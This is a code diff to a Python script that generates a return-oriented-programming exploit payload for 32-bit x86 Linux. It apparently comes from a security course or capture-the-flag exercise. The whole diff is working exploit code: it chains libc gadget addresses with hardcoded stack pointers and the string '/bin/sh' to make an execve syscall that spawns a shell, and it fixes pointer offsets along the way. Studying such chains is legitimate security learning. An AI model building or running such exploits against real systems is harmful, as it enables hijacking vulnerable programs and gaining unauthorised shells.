@@ -21,12 +21,10 @@ class GenerateShellcode:
 
     def store_word(self, word):
         reversed_bytes = word.to_bytes(self.num_bytes, byteorder='little')
-        print(hex(word))
 
         for i in range(self.num_bytes):  # Iterate over each of the four bytes in the word
             index = self.buffer_offset + self.num_bytes*self.buffer_word_index + i
             self.buffer[index] = reversed_bytes[i]
-            print(index)
 
         self.buffer_word_index += 1
 
@@ -36,6 +34,7 @@ class GenerateShellcode:
         self.store_word(libc_gadget)
 
     def store_ptr_above(self, num_words_above):
+        # TODO(samanthayu): Find correct buffer start
         addr = 0xbfffed1c + self.num_bytes*self.buffer_word_index + num_words_above
         self.store_word(addr)
         print("ADDRESS: " + hex(addr))
@@ -51,21 +50,21 @@ class GenerateShellcode:
         self.store_word(0xb7e3579c)  # xor eax, eax ; ret ;
         self.store_word(0xb7e34c6c)  # pop ecx ; pop edx ; ret ;
         self.store_word(0x0b0b0b0b)
-        self.store_ptr_above(10)     # Point to zero word
+        self.store_word(0xbfffee24 - 0x4 - 0x18)  # Point to zero word - 0x18f
 
-        # self.store_word(0xb7e34ca3)  # mov dword ptr [edx + 0x18], eax ; ret ;
+        self.store_word(0xb7e34ca3)  # mov dword ptr [edx + 0x18], eax ; ret ;
         self.store_word(0xb7e688a7)  # add al, ch ; ret ;
 
         self.store_word(0xb7ef11c8)  # pop ebx ; ret ;
-        self.store_ptr_above(7)      # Point to "/bin/sh"
+        self.store_word(0xbfffee24)  # Point to "/bin/sh"
         self.store_word(0xb7e34c6c)  # pop ecx ; pop edx ; ret ;
-        self.store_ptr_above(3)      # Point to address of the argv array
-        self.store_ptr_above(3)      # Point to address of the envp array
+        self.store_word(0xbfffee24 - 0x8)  # Point to address of the argv array
+        self.store_word(0xbfffee24 - 0x4)  # Point to address of the envp array
 
         self.store_word(0xb7eba265)  # call dword ptr gs:[0x10] ; ret ;
-        self.store_ptr_above(2)
-        # self.store_word(0x0)
-        self.store_str("/bin")
+        self.store_word(0xbfffee24 - 0x4)
+        self.store_word(0xdecafbad)  # Temporary value which will get replaced with 0 with 0xb7e34ca3 gadget
+        self.store_str("/bin")  # 0xbfffee24
         self.store_str("/sh\0")
 
 
